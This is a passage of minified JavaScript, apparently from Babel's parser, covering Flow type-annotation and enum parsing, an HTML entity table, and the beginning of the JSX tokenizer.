Q.specifiers=this.parseExportSpecifiers(!0),super.parseExportFrom(Q),null;else return this.flowParseTypeAlias(Y)}else if(this.isContextual(131)){Q.exportKind="type";let Y=this.startNode();return this.next(),this.flowParseOpaqueType(Y,!1)}else if(this.isContextual(129)){Q.exportKind="type";let Y=this.startNode();return this.next(),this.flowParseInterface(Y)}else if(this.isContextual(126)){Q.exportKind="value";let Y=this.startNode();return this.next(),this.flowParseEnumDeclaration(Y)}else return super.parseExportDeclaration(Q)}eatExportStar(Q){if(super.eatExportStar(Q))return!0;if(this.isContextual(130)&&this.lookahead().type===55)return Q.exportKind="type",this.next(),this.next(),!0;return!1}maybeParseExportNamespaceSpecifier(Q){let{startLoc:Y}=this.state,W=super.maybeParseExportNamespaceSpecifier(Q);if(W&&Q.exportKind==="type")this.unexpected(Y);return W}parseClassId(Q,Y,W){if(super.parseClassId(Q,Y,W),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration()}parseClassMember(Q,Y,W){let{startLoc:G}=this.state;if(this.isContextual(125)){if(super.parseClassMemberFromModifier(Q,Y))return;Y.declare=!0}if(super.parseClassMember(Q,Y,W),Y.declare){if(Y.type!=="ClassProperty"&&Y.type!=="ClassPrivateProperty"&&Y.type!=="PropertyDefinition")this.raise(A1.DeclareClassElement,G);else if(Y.value)this.raise(A1.DeclareClassFieldInitializer,Y.value)}}isIterator(Q){return Q==="iterator"||Q==="asyncIterator"}readIterator(){let Q=super.readWord1(),Y="@@"+Q;if(!this.isIterator(Q)||!this.state.inType)this.raise(S.InvalidIdentifier,this.state.curPosition(),{identifierName:Y});this.finishToken(132,Y)}getTokenFromCode(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===123&&Y===124)this.finishOp(6,2);else if(this.state.inType&&(Q===62||Q===60))this.finishOp(Q===62?48:47,1);else if(this.state.inType&&Q===63)if(Y===46)this.finishOp(18,2);else this.finishOp(17,1);else if(lP(Q,Y,this.input.charCodeAt(this.state.pos+2)))this.state.pos+=2,this.readIterator();else super.getTokenFromCode(Q)}isAssignable(Q,Y){if(Q.type==="TypeCastExpression")return this.isAssignable(Q.expression,Y);else return super.isAssignable(Q,Y)}toAssignable(Q,Y=!1){if(!Y&&Q.type==="AssignmentExpression"&&Q.left.type==="TypeCastExpression")Q.left=this.typeCastToParameter(Q.left);super.toAssignable(Q,Y)}toAssignableList(Q,Y,W){for(let G=0;G<Q.length;G++){let H=Q[G];if((H==null?void 0:H.type)==="TypeCastExpression")Q[G]=this.typeCastToParameter(H)}super.toAssignableList(Q,Y,W)}toReferencedList(Q,Y){for(let G=0;G<Q.length;G++){var W;let H=Q[G];if(H&&H.type==="TypeCastExpression"&&!((W=H.extra)!=null&&W.parenthesized)&&(Q.length>1||!Y))this.raise(A1.TypeCastInPattern,H.typeAnnotation)}return Q}parseArrayLike(Q,Y,W,G){let H=super.parseArrayLike(Q,Y,W,G);if(Y&&!this.state.maybeInArrowParameters)this.toReferencedList(H.elements);return H}isValidLVal(Q,Y,W){return Q==="TypeCastExpression"||super.isValidLVal(Q,Y,W)}parseClassProperty(Q){if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassProperty(Q)}parseClassPrivateProperty(Q){if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassPrivateProperty(Q)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(14)||super.isClassProperty()}isNonstaticConstructor(Q){return!this.match(14)&&super.isNonstaticConstructor(Q)}pushClassMethod(Q,Y,W,G,H,z){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();if(super.pushClassMethod(Q,Y,W,G,H,z),Y.params&&H){let $=Y.params;if($.length>0&&this.isThisParam($[0]))this.raise(A1.ThisParamBannedInConstructor,Y)}else if(Y.type==="MethodDefinition"&&H&&Y.value.params){let $=Y.value.params;if($.length>0&&this.isThisParam($[0]))this.raise(A1.ThisParamBannedInConstructor,Y)}}pushClassPrivateMethod(Q,Y,W,G){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();super.pushClassPrivateMethod(Q,Y,W,G)}parseClassSuper(Q){if(super.parseClassSuper(Q),Q.superClass&&(this.match(47)||this.match(51)))Q.superTypeParameters=this.flowParseTypeParameterInstantiationInExpression();if(this.isContextual(113)){this.next();let Y=Q.implements=[];do{let W=this.startNode();if(W.id=this.flowParseRestrictedIdentifier(!0),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();else W.typeParameters=null;Y.push(this.finishNode(W,"ClassImplements"))}while(this.eat(12))}}checkGetterSetterParams(Q){super.checkGetterSetterParams(Q);let Y=this.getObjectOrClassMethodParams(Q);if(Y.length>0){let W=Y[0];if(this.isThisParam(W)&&Q.kind==="get")this.raise(A1.GetterMayNotHaveThisParam,W);else if(this.isThisParam(W))this.raise(A1.SetterMayNotHaveThisParam,W)}}parsePropertyNamePrefixOperator(Q){Q.variance=this.flowParseVariance()}parseObjPropValue(Q,Y,W,G,H,z,$){if(Q.variance)this.unexpected(Q.variance.loc.start);delete Q.variance;let V;if(this.match(47)&&!z){if(V=this.flowParseTypeParameterDeclaration(),!this.match(10))this.unexpected()}let K=super.parseObjPropValue(Q,Y,W,G,H,z,$);if(V)(K.value||K).typeParameters=V;return K}parseFunctionParamType(Q){if(this.eat(17)){if(Q.type!=="Identifier")this.raise(A1.PatternIsOptional,Q);if(this.isThisParam(Q))this.raise(A1.ThisParamMayNotBeOptional,Q);Q.optional=!0}if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();else if(this.isThisParam(Q))this.raise(A1.ThisParamAnnotationRequired,Q);if(this.match(29)&&this.isThisParam(Q))this.raise(A1.ThisParamNoDefault,Q);return this.resetEndLocation(Q),Q}parseMaybeDefault(Q,Y){let W=super.parseMaybeDefault(Q,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(A1.TypeBeforeInitializer,W.typeAnnotation);return W}checkImportReflection(Q){if(super.checkImportReflection(Q),Q.module&&Q.importKind!=="value")this.raise(A1.ImportReflectionHasImportType,Q.specifiers[0].loc.start)}parseImportSpecifierLocal(Q,Y,W){Y.local=T$(Q)?this.flowParseRestrictedIdentifier(!0,!0):this.parseIdentifier(),Q.specifiers.push(this.finishImportSpecifier(Y,W))}isPotentialImportPhase(Q){if(super.isPotentialImportPhase(Q))return!0;if(this.isContextual(130)){if(!Q)return!0;let Y=this.lookaheadCharCode();return Y===123||Y===42}return!Q&&this.isContextual(87)}applyImportPhase(Q,Y,W,G){if(super.applyImportPhase(Q,Y,W,G),Y){if(!W&&this.match(65))return;Q.exportKind=W==="type"?W:"value"}else{if(W==="type"&&this.match(55))this.unexpected();Q.importKind=W==="type"||W==="typeof"?W:"value"}}parseImportSpecifier(Q,Y,W,G,H){let z=Q.imported,$=null;if(z.type==="Identifier"){if(z.name==="type")$="type";else if(z.name==="typeof")$="typeof"}let V=!1;if(this.isContextual(93)&&!this.isLookaheadContextual("as")){let Z=this.parseIdentifier(!0);if($!==null&&!u9(this.state.type))Q.imported=Z,Q.importKind=$,Q.local=this.cloneIdentifier(Z);else Q.imported=z,Q.importKind=null,Q.local=this.parseIdentifier()}else{if($!==null&&u9(this.state.type))Q.imported=this.parseIdentifier(!0),Q.importKind=$;else{if(Y)throw this.raise(S.ImportBindingIsString,Q,{importName:z.value});Q.imported=z,Q.importKind=null}if(this.eatContextual(93))Q.local=this.parseIdentifier();else V=!0,Q.local=this.cloneIdentifier(Q.imported)}let K=T$(Q);if(W&&K)this.raise(A1.ImportTypeShorthandOnlyInPureImport,Q);if(W||K)this.checkReservedType(Q.local.name,Q.local.loc.start,!0);if(V&&!W&&!K)this.checkReservedWord(Q.local.name,Q.loc.start,!0,!0);return this.finishImportSpecifier(Q,"ImportSpecifier")}parseBindingAtom(){switch(this.state.type){case 78:return this.parseIdentifier(!0);default:return super.parseBindingAtom()}}parseFunctionParams(Q,Y){let W=Q.kind;if(W!=="get"&&W!=="set"&&this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();super.parseFunctionParams(Q,Y)}parseVarId(Q,Y){if(super.parseVarId(Q,Y),this.match(14))Q.id.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(Q.id)}parseAsyncArrowFromCallExpression(Q,Y){if(this.match(14)){let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0,Q.returnType=this.flowParseTypeAnnotation(),this.state.noAnonFunctionType=W}return super.parseAsyncArrowFromCallExpression(Q,Y)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}parseMaybeAssign(Q,Y){var W;let G=null,H;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(G=this.state.clone(),H=this.tryParse(()=>super.parseMaybeAssign(Q,Y),G),!H.error)return H.node;let{context:V}=this.state,K=V[V.length-1];if(K===e1.j_oTag||K===e1.j_expr)V.pop()}if((W=H)!=null&&W.error||this.match(47)){var z,$;G=G||this.state.clone();let V,K=this.tryParse((q)=>{var B;V=this.flowParseTypeParameterDeclaration();let M=this.forwardNoArrowParamsConversionAt(V,()=>{let R=super.parseMaybeAssign(Q,Y);return this.resetStartLocationFromNode(R,V),R});if((B=M.extra)!=null&&B.parenthesized)q();let O=this.maybeUnwrapTypeCastExpression(M);if(O.type!=="ArrowFunctionExpression")q();return O.typeParameters=V,this.resetStartLocationFromNode(O,V),M},G),Z=null;if(K.node&&this.maybeUnwrapTypeCastExpression(K.node).type==="ArrowFunctionExpression"){if(!K.error&&!K.aborted){if(K.node.async)this.raise(A1.UnexpectedTypeParameterBeforeAsyncArrowFunction,V);return K.node}Z=K.node}if((z=H)!=null&&z.node)return this.state=H.failState,H.node;if(Z)return this.state=K.failState,Z;if(($=H)!=null&&$.thrown)throw H.error;if(K.thrown)throw K.error;throw this.raise(A1.UnexpectedTokenAfterTypeParameter,V)}return super.parseMaybeAssign(Q,Y)}parseArrow(Q){if(this.match(14)){let Y=this.tryParse(()=>{let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0;let G=this.startNode();if([G.typeAnnotation,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),this.state.noAnonFunctionType=W,this.canInsertSemicolon())this.unexpected();if(!this.match(19))this.unexpected();return G});if(Y.thrown)return null;if(Y.error)this.state=Y.failState;Q.returnType=Y.node.typeAnnotation?this.finishNode(Y.node,"TypeAnnotation"):null}return super.parseArrow(Q)}shouldParseArrow(Q){return this.match(14)||super.shouldParseArrow(Q)}setArrowFunctionParameters(Q,Y){if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))Q.params=Y;else super.setArrowFunctionParameters(Q,Y)}checkParams(Q,Y,W,G=!0){if(W&&this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))return;for(let H=0;H<Q.params.length;H++)if(this.isThisParam(Q.params[H])&&H>0)this.raise(A1.ThisParamMustBeFirst,Q.params[H]);super.checkParams(Q,Y,W,G)}parseParenAndDistinguishExpression(Q){return super.parseParenAndDistinguishExpression(Q&&!this.state.noArrowAt.includes(this.sourceToOffsetPos(this.state.start)))}parseSubscripts(Q,Y,W){if(Q.type==="Identifier"&&Q.name==="async"&&this.state.noArrowAt.includes(Y.index)){this.next();let G=this.startNodeAt(Y);G.callee=Q,G.arguments=super.parseCallExpressionArguments(),Q=this.finishNode(G,"CallExpression")}else if(Q.type==="Identifier"&&Q.name==="async"&&this.match(47)){let G=this.state.clone(),H=this.tryParse(($)=>this.parseAsyncArrowWithTypeParameters(Y)||$(),G);if(!H.error&&!H.aborted)return H.node;let z=this.tryParse(()=>super.parseSubscripts(Q,Y,W),G);if(z.node&&!z.error)return z.node;if(H.node)return this.state=H.failState,H.node;if(z.node)return this.state=z.failState,z.node;throw H.error||z.error}return super.parseSubscripts(Q,Y,W)}parseSubscript(Q,Y,W,G){if(this.match(18)&&this.isLookaheadToken_lt()){if(G.optionalChainMember=!0,W)return G.stop=!0,Q;this.next();let H=this.startNodeAt(Y);return H.callee=Q,H.typeArguments=this.flowParseTypeParameterInstantiationInExpression(),this.expect(10),H.arguments=this.parseCallExpressionArguments(),H.optional=!0,this.finishCallExpression(H,!0)}else if(!W&&this.shouldParseTypes()&&(this.match(47)||this.match(51))){let H=this.startNodeAt(Y);H.callee=Q;let z=this.tryParse(()=>{if(H.typeArguments=this.flowParseTypeParameterInstantiationCallOrNew(),this.expect(10),H.arguments=super.parseCallExpressionArguments(),G.optionalChainMember)H.optional=!1;return this.finishCallExpression(H,G.optionalChainMember)});if(z.node){if(z.error)this.state=z.failState;return z.node}}return super.parseSubscript(Q,Y,W,G)}parseNewCallee(Q){super.parseNewCallee(Q);let Y=null;if(this.shouldParseTypes()&&this.match(47))Y=this.tryParse(()=>this.flowParseTypeParameterInstantiationCallOrNew()).node;Q.typeArguments=Y}parseAsyncArrowWithTypeParameters(Q){let Y=this.startNodeAt(Q);if(this.parseFunctionParams(Y,!1),!this.parseArrow(Y))return;return super.parseArrowExpression(Y,void 0,!0)}readToken_mult_modulo(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===42&&Y===47&&this.state.hasFlowComment){this.state.hasFlowComment=!1,this.state.pos+=2,this.nextToken();return}super.readToken_mult_modulo(Q)}readToken_pipe_amp(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===124&&Y===125){this.finishOp(9,2);return}super.readToken_pipe_amp(Q)}parseTopLevel(Q,Y){let W=super.parseTopLevel(Q,Y);if(this.state.hasFlowComment)this.raise(A1.UnterminatedFlowComment,this.state.curPosition());return W}skipBlockComment(){if(this.hasPlugin("flowComments")&&this.skipFlowComment()){if(this.state.hasFlowComment)throw this.raise(A1.NestedFlowComment,this.state.startLoc);this.hasFlowCommentCompletion();let Q=this.skipFlowComment();if(Q)this.state.pos+=Q,this.state.hasFlowComment=!0;return}return super.skipBlockComment(this.state.hasFlowComment?"*-/":"*/")}skipFlowComment(){let{pos:Q}=this.state,Y=2;while([32,9].includes(this.input.charCodeAt(Q+Y)))Y++;let W=this.input.charCodeAt(Y+Q),G=this.input.charCodeAt(Y+Q+1);if(W===58&&G===58)return Y+2;if(this.input.slice(Y+Q,Y+Q+12)==="flow-include")return Y+12;if(W===58&&G!==58)return Y;return!1}hasFlowCommentCompletion(){if(this.input.indexOf("*/",this.state.pos)===-1)throw this.raise(S.UnterminatedComment,this.state.curPosition())}flowEnumErrorBooleanMemberNotInitialized(Q,{enumName:Y,memberName:W}){this.raise(A1.EnumBooleanMemberNotInitialized,Q,{memberName:W,enumName:Y})}flowEnumErrorInvalidMemberInitializer(Q,Y){return this.raise(!Y.explicitType?A1.EnumInvalidMemberInitializerUnknownType:Y.explicitType==="symbol"?A1.EnumInvalidMemberInitializerSymbolType:A1.EnumInvalidMemberInitializerPrimaryType,Q,Y)}flowEnumErrorNumberMemberNotInitialized(Q,Y){this.raise(A1.EnumNumberMemberNotInitialized,Q,Y)}flowEnumErrorStringMemberInconsistentlyInitialized(Q,Y){this.raise(A1.EnumStringMemberInconsistentlyInitialized,Q,Y)}flowEnumMemberInit(){let Q=this.state.startLoc,Y=()=>this.match(12)||this.match(8);switch(this.state.type){case 135:{let W=this.parseNumericLiteral(this.state.value);if(Y())return{type:"number",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}case 134:{let W=this.parseStringLiteral(this.state.value);if(Y())return{type:"string",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}case 85:case 86:{let W=this.parseBooleanLiteral(this.match(85));if(Y())return{type:"boolean",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}default:return{type:"invalid",loc:Q}}}flowEnumMemberRaw(){let Q=this.state.startLoc,Y=this.parseIdentifier(!0),W=this.eat(29)?this.flowEnumMemberInit():{type:"none",loc:Q};return{id:Y,init:W}}flowEnumCheckExplicitTypeMismatch(Q,Y,W){let{explicitType:G}=Y;if(G===null)return;if(G!==W)this.flowEnumErrorInvalidMemberInitializer(Q,Y)}flowEnumMembers({enumName:Q,explicitType:Y}){let W=new Set,G={booleanMembers:[],numberMembers:[],stringMembers:[],defaultedMembers:[]},H=!1;while(!this.match(8)){if(this.eat(21)){H=!0;break}let z=this.startNode(),{id:$,init:V}=this.flowEnumMemberRaw(),K=$.name;if(K==="")continue;if(/^[a-z]/.test(K))this.raise(A1.EnumInvalidMemberName,$,{memberName:K,suggestion:K[0].toUpperCase()+K.slice(1),enumName:Q});if(W.has(K))this.raise(A1.EnumDuplicateMemberName,$,{memberName:K,enumName:Q});W.add(K);let Z={enumName:Q,explicitType:Y,memberName:K};switch(z.id=$,V.type){case"boolean":{this.flowEnumCheckExplicitTypeMismatch(V.loc,Z,"boolean"),z.init=V.value,G.booleanMembers.push(this.finishNode(z,"EnumBooleanMember"));break}case"number":{this.flowEnumCheckExplicitTypeMismatch(V.loc,Z,"number"),z.init=V.value,G.numberMembers.push(this.finishNode(z,"EnumNumberMember"));break}case"string":{this.flowEnumCheckExplicitTypeMismatch(V.loc,Z,"string"),z.init=V.value,G.stringMembers.push(this.finishNode(z,"EnumStringMember"));break}case"invalid":throw this.flowEnumErrorInvalidMemberInitializer(V.loc,Z);case"none":switch(Y){case"boolean":this.flowEnumErrorBooleanMemberNotInitialized(V.loc,Z);break;case"number":this.flowEnumErrorNumberMemberNotInitialized(V.loc,Z);break;default:G.defaultedMembers.push(this.finishNode(z,"EnumDefaultedMember"))}}if(!this.match(8))this.expect(12)}return{members:G,hasUnknownMembers:H}}flowEnumStringMembers(Q,Y,{enumName:W}){if(Q.length===0)return Y;else if(Y.length===0)return Q;else if(Y.length>Q.length){for(let G of Q)this.flowEnumErrorStringMemberInconsistentlyInitialized(G,{enumName:W});return Y}else{for(let G of Y)this.flowEnumErrorStringMemberInconsistentlyInitialized(G,{enumName:W});return Q}}flowEnumParseExplicitType({enumName:Q}){if(!this.eatContextual(102))return null;if(!W0(this.state.type))throw this.raise(A1.EnumInvalidExplicitTypeUnknownSupplied,this.state.startLoc,{enumName:Q});let{value:Y}=this.state;if(this.next(),Y!=="boolean"&&Y!=="number"&&Y!=="string"&&Y!=="symbol")this.raise(A1.EnumInvalidExplicitType,this.state.startLoc,{enumName:Q,invalidEnumType:Y});return Y}flowEnumBody(Q,Y){let W=Y.name,G=Y.loc.start,H=this.flowEnumParseExplicitType({enumName:W});this.expect(5);let{members:z,hasUnknownMembers:$}=this.flowEnumMembers({enumName:W,explicitType:H});switch(Q.hasUnknownMembers=$,H){case"boolean":return Q.explicitType=!0,Q.members=z.booleanMembers,this.expect(8),this.finishNode(Q,"EnumBooleanBody");case"number":return Q.explicitType=!0,Q.members=z.numberMembers,this.expect(8),this.finishNode(Q,"EnumNumberBody");case"string":return Q.explicitType=!0,Q.members=this.flowEnumStringMembers(z.stringMembers,z.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(Q,"EnumStringBody");case"symbol":return Q.members=z.defaultedMembers,this.expect(8),this.finishNode(Q,"EnumSymbolBody");default:{let V=()=>{return Q.members=[],this.expect(8),this.finishNode(Q,"EnumStringBody")};Q.explicitType=!1;let K=z.booleanMembers.length,Z=z.numberMembers.length,q=z.stringMembers.length,B=z.defaultedMembers.length;if(!K&&!Z&&!q&&!B)return V();else if(!K&&!Z)return Q.members=this.flowEnumStringMembers(z.stringMembers,z.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(Q,"EnumStringBody");else if(!Z&&!q&&K>=B){for(let M of z.defaultedMembers)this.flowEnumErrorBooleanMemberNotInitialized(M.loc.start,{enumName:W,memberName:M.id.name});return Q.members=z.booleanMembers,this.expect(8),this.finishNode(Q,"EnumBooleanBody")}else if(!K&&!q&&Z>=B){for(let M of z.defaultedMembers)this.flowEnumErrorNumberMemberNotInitialized(M.loc.start,{enumName:W,memberName:M.id.name});return Q.members=z.numberMembers,this.expect(8),this.finishNode(Q,"EnumNumberBody")}else return this.raise(A1.EnumInconsistentMemberValues,G,{enumName:W}),V()}}}flowParseEnumDeclaration(Q){let Y=this.parseIdentifier();return Q.id=Y,Q.body=this.flowEnumBody(this.startNode(),Y),this.finishNode(Q,"EnumDeclaration")}jsxParseOpeningElementAfterName(Q){if(this.shouldParseTypes()){if(this.match(47)||this.match(51))Q.typeArguments=this.flowParseTypeParameterInstantiationInExpression()}return super.jsxParseOpeningElementAfterName(Q)}isLookaheadToken_lt(){let Q=this.nextTokenStart();if(this.input.charCodeAt(Q)===60){let Y=this.input.charCodeAt(Q+1);return Y!==60&&Y!==61}return!1}reScan_lt_gt(){let{type:Q}=this.state;if(Q===47)this.state.pos-=1,this.readToken_lt();else if(Q===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:Q}=this.state;if(Q===51)return this.state.pos-=2,this.finishOp(47,1),47;return Q}maybeUnwrapTypeCastExpression(Q){return Q.type==="TypeCastExpression"?Q.expression:Q}},tP={__proto__:null,quot:'"',amp:"&",apos:"'",lt:"<",gt:">",nbsp:" ",iexcl:"¡",cent:"¢",pound:"£",curren:"¤",yen:"¥",brvbar:"¦",sect:"§",uml:"¨",copy:"©",ordf:"ª",laquo:"«",not:"¬",shy:"­",reg:"®",macr:"¯",deg:"°",plusmn:"±",sup2:"²",sup3:"³",acute:"´",micro:"µ",para:"¶",middot:"·",cedil:"¸",sup1:"¹",ordm:"º",raquo:"»",frac14:"¼",frac12:"½",frac34:"¾",iquest:"¿",Agrave:"À",Aacute:"Á",Acirc:"Â",Atilde:"Ã",Auml:"Ä",Aring:"Å",AElig:"Æ",Ccedil:"Ç",Egrave:"È",Eacute:"É",Ecirc:"Ê",Euml:"Ë",Igrave:"Ì",Iacute:"Í",Icirc:"Î",Iuml:"Ï",ETH:"Ð",Ntilde:"Ñ",Ograve:"Ò",Oacute:"Ó",Ocirc:"Ô",Otilde:"Õ",Ouml:"Ö",times:"×",Oslash:"Ø",Ugrave:"Ù",Uacute:"Ú",Ucirc:"Û",Uuml:"Ü",Yacute:"Ý",THORN:"Þ",szlig:"ß",agrave:"à",aacute:"á",acirc:"â",atilde:"ã",auml:"ä",aring:"å",aelig:"æ",ccedil:"ç",egrave:"è",eacute:"é",ecirc:"ê",euml:"ë",igrave:"ì",iacute:"í",icirc:"î",iuml:"ï",eth:"ð",ntilde:"ñ",ograve:"ò",oacute:"ó",ocirc:"ô",otilde:"õ",ouml:"ö",divide:"÷",oslash:"ø",ugrave:"ù",uacute:"ú",ucirc:"û",uuml:"ü",yacute:"ý",thorn:"þ",yuml:"ÿ",OElig:"Œ",oelig:"œ",Scaron:"Š",scaron:"š",Yuml:"Ÿ",fnof:"ƒ",circ:"ˆ",tilde:"˜",Alpha:"Α",Beta:"Β",Gamma:"Γ",Delta:"Δ",Epsilon:"Ε",Zeta:"Ζ",Eta:"Η",Theta:"Θ",Iota:"Ι",Kappa:"Κ",Lambda:"Λ",Mu:"Μ",Nu:"Ν",Xi:"Ξ",Omicron:"Ο",Pi:"Π",Rho:"Ρ",Sigma:"Σ",Tau:"Τ",Upsilon:"Υ",Phi:"Φ",Chi:"Χ",Psi:"Ψ",Omega:"Ω",alpha:"α",beta:"β",gamma:"γ",delta:"δ",epsilon:"ε",zeta:"ζ",eta:"η",theta:"θ",iota:"ι",kappa:"κ",lambda:"λ",mu:"μ",nu:"ν",xi:"ξ",omicron:"ο",pi:"π",rho:"ρ",sigmaf:"ς",sigma:"σ",tau:"τ",upsilon:"υ",phi:"φ",chi:"χ",psi:"ψ",omega:"ω",thetasym:"ϑ",upsih:"ϒ",piv:"ϖ",ensp:" ",emsp:" ",thinsp:" ",zwnj:"‌",zwj:"‍",lrm:"‎",rlm:"‏",ndash:"–",mdash:"—",lsquo:"‘",rsquo:"’",sbquo:"‚",ldquo:"“",rdquo:"”",bdquo:"„",dagger:"†",Dagger:"‡",bull:"•",hellip:"…",permil:"‰",prime:"′",Prime:"″",lsaquo:"‹",rsaquo:"›",oline:"‾",frasl:"⁄",euro:"€",image:"ℑ",weierp:"℘",real:"ℜ",trade:"™",alefsym:"ℵ",larr:"←",uarr:"↑",rarr:"→",darr:"↓",harr:"↔",crarr:"↵",lArr:"⇐",uArr:"⇑",rArr:"⇒",dArr:"⇓",hArr:"⇔",forall:"∀",part:"∂",exist:"∃",empty:"∅",nabla:"∇",isin:"∈",notin:"∉",ni:"∋",prod:"∏",sum:"∑",minus:"−",lowast:"∗",radic:"√",prop:"∝",infin:"∞",ang:"∠",and:"∧",or:"∨",cap:"∩",cup:"∪",int:"∫",there4:"∴",sim:"∼",cong:"≅",asymp:"≈",ne:"≠",equiv:"≡",le:"≤",ge:"≥",sub:"⊂",sup:"⊃",nsub:"⊄",sube:"⊆",supe:"⊇",oplus:"⊕",otimes:"⊗",perp:"⊥",sdot:"⋅",lceil:"⌈",rceil:"⌉",lfloor:"⌊",rfloor:"⌋",lang:"〈",rang:"〉",loz:"◊",spades:"♠",clubs:"♣",hearts:"♥",diams:"♦"},eP=/\r\n|[\r\n\u2028\u2029]/,_5=new RegExp(eP.source,"g");function x8(X){switch(X){case 10:case 13:case 8232:case 8233:return!0;default:return!1}}function _$(X,J,Q){for(let Y=J;Y<Q;Y++)if(x8(X.charCodeAt(Y)))return!0;return!1}var w2=/(?:\s|\/\/.*|\/\*[^]*?\*\/)*/g,N2=/(?:[^\S\n\r\u2028\u2029]|\/\/.*|\/\*.*?\*\/)*/g;function XS(X){switch(X){case 9:case 11:case 12:case 32:case 160:case 5760:case 8192:case 8193:case 8194:case 8195:case 8196:case 8197:case 8198:case 8199:case 8200:case 8201:case 8202:case 8239:case 8287:case 12288:case 65279:return!0;default:return!1}}var _X=G6`jsx`({AttributeIsEmpty:"JSX attributes must only be assigned a non-empty expression.",MissingClosingTagElement:({openingTagName:X})=>`Expected corresponding JSX closing tag for <${X}>.`,MissingClosingTagFragment:"Expected corresponding JSX closing tag for <>.",UnexpectedSequenceExpression:"Sequence expressions cannot be directly nested inside JSX. Did you mean to wrap it in parentheses (...)?",UnexpectedToken:({unexpected:X,HTMLEntity:J})=>`Unexpected token \`${X}\`. Did you mean \`${J}\` or \`{'${X}'}\`?`,UnsupportedJsxValue:"JSX value should be either an expression or a quoted JSX text.",UnterminatedJsxContent:"Unterminated JSX contents.",UnwrappedAdjacentJSXElements:"Adjacent JSX elements must be wrapped in an enclosing tag. Did you want a JSX fragment <>...</>?"});function QX(X){return X?X.type==="JSXOpeningFragment"||X.type==="JSXClosingFragment":!1}function v8(X){if(X.type==="JSXIdentifier")return X.name;if(X.type==="JSXNamespacedName")return X.namespace.name+":"+X.name.name;if(X.type==="JSXMemberExpression")return v8(X.object)+"."+v8(X.property);throw Error("Node had unexpected type: "+X.type)}var JS=(X)=>class extends X{jsxReadToken(){let Q="",Y=this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(_X.UnterminatedJsxContent,this.state.startLoc);let W=this.input.charCodeAt(this.state.pos);switch(W){case 60:case 123:if(this.state.pos===this.state.start){if(W===60&&this.state.canStartJSXElement)++this.state.pos,this.finishToken(143);else super.getTokenFromCode(W);return}Q+=this.input.slice(Y,this.state.pos),this.finishToken(142,Q);return;case 38:Q+=this.input.slice(Y,this.state.pos),Q+=this.jsxReadEntity(),Y=this.state.pos;break;case 62:case 125:default:if(x8(W))Q+=this.input.slice(Y,this.state.pos),Q+=this.jsxReadNewLine(!0),Y=this.state.pos;else++this.state.pos}}}jsxReadNewLine(Q){let Y=this.input.charCodeAt(this.state.pos),W;if(++this.state.pos,Y===13&&this.input.charCodeAt(this.state.pos)===10)++this.state.pos,W=Q?`
`:`\r
`;else W=String.fromCharCode(Y);return++this.state.curLine,this.state.lineStart=this.state.pos,W}jsxReadString(Q){let Y="",W=++this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(S.UnterminatedString,this.state.startLoc);let G=this.input.charCodeAt(this.state.pos);if(G===Q)break;if(G===38)Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadEntity(),W=this.state.pos;else if(x8(G))Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadNewLine(!1),W=this.state.pos;else++this.state.pos}Y+=this.input.slice(W,this.state.pos++),this.finishToken(134,Y)}jsxReadEntity(){let Q=++this.state.pos;if(this.codePointAtPos(this.state.pos)===35){++this.state.pos;let Y=10;if(this.codePointAtPos(this.state.pos)===120)Y=16,++this.state.pos;let W=this.readInt(Y,void 0,!1,"bail");if(W!==null&&this.codePointAtPos(this.state.pos)===59)return++this.state.pos,String.fromCodePoint(W)}else{let Y=0,W=!1;while(Y++<10&&this.state.pos<this.length&&!(W=this.codePointAtPos(this.state.pos)===59))++this.state.pos;if(W){let G=this.input.slice(Q,this.state.pos),H=tP[G];if(++this.state.pos,H)return H}}return this.state.pos=Q,"&"}jsxReadWord(){let Q,Y=this.state.pos;do Q=this.input.charCodeAt(++this.state.pos);while(f8(Q)||Q===45);this.finishToken(141,this.input.slice(Y,this.state.pos))}jsxParseIdentifier(){let Q=this.startNode();if(this.match(141))Q.name=this.state.value;else if(x2(this.state.type))Q.name=WX(this.state.type);else this.unexpected();return this.next(),this.finishNode(Q,"JSXIdentifier")}jsxParseNamespacedName(){let Q=this.state.startLoc,Y=this.jsxParseIdentifier();if(!this.eat(14))return Y;let W=this.startNodeAt(Q);return W.namespace=Y,W.name=this.jsxParseIdentifier(),this.finishNode(W,"JSXNamespacedName")}jsxParseElementName(){let Q=this.state.startLoc,Y=this.jsxParseNamespacedName();if(Y.type==="JSXNamespacedName")return Y;while(this.eat(16)){let 